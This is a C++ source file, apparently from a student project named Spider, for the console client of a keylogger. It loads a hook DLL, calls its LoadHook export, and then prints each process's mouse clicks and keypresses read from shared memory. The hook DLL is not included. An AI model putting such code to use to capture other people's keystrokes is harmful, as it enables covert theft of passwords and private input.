// SpiderClient.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

#define DLL_NAME_64 L"C:\\Users\\lecler_i\\Documents\\Visual Studio 2013\\Projects\\Spider Client\\x64\\Debug\\ClientDll.dll"
#define DLL_NAME_86 L"F:\\Work\\spider-2017-sana_c\\SpiderClient\\x64\\Debug\\ClientDll.dll"

#include <windows.h>
#include <string>
#include <iostream>
#include <queue>

#include "Injector.h"
#include "SharedMemoryServer.h"
#include "data.h"

int entry_main(int argc, _TCHAR* argv[])
{
	DWORD		pid;
	HANDLE		l;
	Injector	&i = Injector::GetInstance();
	SharedMemoryServer	shm("lllol");
	
	HMODULE dll = LoadLibrary(L"ClientDll.dll");
	if (dll == NULL) {
		printf("The DLL could not be found.n");
		getchar();
		return -1;
	}
	typedef void(*fnPtr)(void);

	fnPtr addr = (fnPtr)GetProcAddress(dll, "LoadHook");
	if (addr == NULL) {
		printf("The function was not found.n");
		getchar();
		return -1;
	}
	addr();
	while (1)
	{
		Data test = shm.pop();
		if (test.t != NONE)
		{
			std::cout << "[" << test.pid << "] ";
			if (test.t == MOUSELOG)
				std::cout << "Click at " << test.data.mouse.x << ";" << test.data.mouse.y << std::endl;
			else
				std::cout << "Keypress " << test.data.key.keyCode << std::endl;
		}
		Sleep(100);
	}
	return (0);
}


int _tmain(int argc, _TCHAR* argv[])
{
	OutputDebugStringW(L"OMG !");
	std::cout << "LOL" << std::endl;
	entry_main(argc, argv);
	system("pause");
	return 0;
}